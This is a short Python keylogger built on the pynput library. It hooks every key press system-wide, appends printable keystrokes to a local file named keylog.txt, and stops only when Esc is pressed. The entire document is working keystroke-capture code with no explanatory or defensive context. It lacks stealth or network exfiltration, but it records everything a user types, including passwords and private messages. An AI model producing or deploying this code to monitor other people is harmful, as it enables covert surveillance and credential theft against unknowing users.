from pynput import keyboard

# This variable will store the recorded keys
keys = []

# Function to write the keys to a file
def write_to_file(keys):
    with open("keylog.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("Key") == -1:
                f.write(k)

# Function called on each key press
def on_press(key):
    keys.append(key)
    write_to_file([key])
    if len(keys) > 100:
        keys.clear()

# Function called when a key is released
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
